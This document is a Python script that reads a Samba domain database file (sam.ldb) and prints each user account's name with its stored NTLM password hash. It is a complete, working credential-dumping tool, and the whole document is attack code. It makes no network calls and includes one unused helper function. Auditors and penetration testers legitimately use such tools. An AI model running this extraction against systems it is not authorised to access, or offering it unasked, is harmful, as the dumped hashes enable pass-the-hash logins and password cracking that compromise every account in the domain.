#!/usr/bin/env python3
import ldb
from samba.credentials import Credentials
from samba.param import LoadParm
from samba.samdb import SamDB
import argparse
import base64
import binascii
import codecs

def connect_ldb(ldb_path):
    lp = LoadParm()
    lp.load_default()
    creds = Credentials()
    creds.guess(lp)
    samdb = SamDB(url='ldb://' + ldb_path, session_info=None, credentials=creds, lp=lp)
    return samdb

def find_base_dn(samdb):
    try:
        results = samdb.search(base="", scope=ldb.SCOPE_BASE, expression="(objectClass=*)")
        for entry in results:
            if 'defaultNamingContext' in entry:
                return entry['defaultNamingContext'][0].decode('utf-8')
    except ldb.LdbError as e:
        print("Error querying LDB for base DN:", e)
    return None



def query_users_with_unicodepwd(samdb, base_dn):
    if not base_dn:
        print("Base DN could not be determined.")
        return

    query = "(&(objectClass=user)(unicodePwd=*))"
    try:
        results = samdb.search(
            base=base_dn,
            expression=query,
            scope=ldb.SCOPE_SUBTREE,
            attrs=['unicodePwd', 'sAMAccountName']
        )
        for entry in results:
            username = entry.get('sAMAccountName', [b""])[0].decode('utf-8')
            unicode_pwd = entry.get('unicodePwd', [])
            if unicode_pwd:
                print(f"Username: {username}")
                for pwd in unicode_pwd:
                    pwd_base64 = base64.b64encode(pwd).decode('ascii')
                    pwd_hex = binascii.hexlify(base64.b64decode(pwd_base64)).decode('ascii')
                    print("NTLM Hash:", pwd_hex,"\n")
            else:
                print(f"\nUsername: {username} has no unicodePwd set or accessible.")
    except ldb.LdbError as e:
        print("Error querying LDB for users with unicodePwd set:", e)



def print_ntlm_like(pwd):
    try:
        pwd += b'=' * ((4 - len(pwd) % 4) % 4)  # Pad with '=' to ensure correct base64 length
        pwd_base64_decoded = base64.b64decode(pwd, validate=True)
        ntlm_like_hex = binascii.hexlify(pwd_base64_decoded)
        print("NTLM-like hash:", ntlm_like_hex.decode('utf-8'))
    except Exception as e:
        print("Error processing password:", e)

def main():
    parser = argparse.ArgumentParser(description="Extract NTLM hashes from Sambas sam.ldb database.")
    parser.add_argument("ldb_file", help="Path to the LDB file")
    args = parser.parse_args()

    samdb = connect_ldb(args.ldb_file)
    base_dn = find_base_dn(samdb)
    query_users_with_unicodepwd(samdb, base_dn)

if __name__ == "__main__":
    main()
